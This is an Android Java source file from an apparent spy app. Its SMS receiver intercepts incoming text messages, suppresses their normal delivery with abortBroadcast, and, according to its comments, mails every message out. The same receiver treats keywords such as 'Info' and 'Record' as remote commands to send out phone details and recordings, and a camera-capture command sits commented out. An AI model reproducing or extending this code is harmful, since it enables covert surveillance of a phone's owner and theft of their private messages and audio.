package com.example.ydg.spyapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;
import android.util.Log;

/**
 * Created by ydg on 2015-02-21.
 * SMS을 먼저 받아 내용을 분석하는 클래스
 * InformationSend 클래스를 활용
 * 받은 모든 SMS는 메일로 전송
 *
 * 추가해야할 것
 * 1. 연결 가능/불가능 등 네트워크 상태에 대한 대처
 * 2.
 *
 * 151102 Remove camera capturing feature
 */
public class SMSBroadcastReceiver extends BroadcastReceiver {

    public final static String LogTag = "checking_BRLogcat";
    public String smsSender;
    public String smsBody;

    public void onReceive(Context context, Intent intent) {
        abortBroadcast();
        Bundle bundle = intent.getExtras();
        SmsMessage[] msgs = null;

        if (bundle != null) {
            Object[] pdus = (Object[])bundle.get("pdus");
            msgs = new SmsMessage[pdus.length];
            smsSender = "";
            smsBody = "";

            for (int i = 0; i < msgs.length; i++) {
                msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                smsSender += msgs[i].getOriginatingAddress();
                smsBody += msgs[i].getMessageBody().toString();
            }
            Log.i(LogTag, "SMS hijacking");
            Toast.makeText(context, smsSender + ": " + smsBody, Toast.LENGTH_SHORT).show();

            InformationSend sendSMS = new InformationSend(context, smsSender, smsBody);
            smsBody.trim();
            if (smsBody.indexOf("Info") != -1) {
                Log.i(LogTag, "Analyze: Info");
                InformationSend sendPhoneInfo = new InformationSend(context, "Info");
            }
            if (smsBody.indexOf("Record") != -1) {
                Log.i(LogTag, "Analyze: Record");
                InformationSend sendRecordData = new InformationSend(context, "Record");
            }
            /*
            if (smsBody.indexOf("Capture") != -1) {
                Log.i(LogTag, "Analyze: Capture");
                InformationSend sendCameraCapture = new InformationSend(context, "Capture");
            }
            */
        }
    }
}
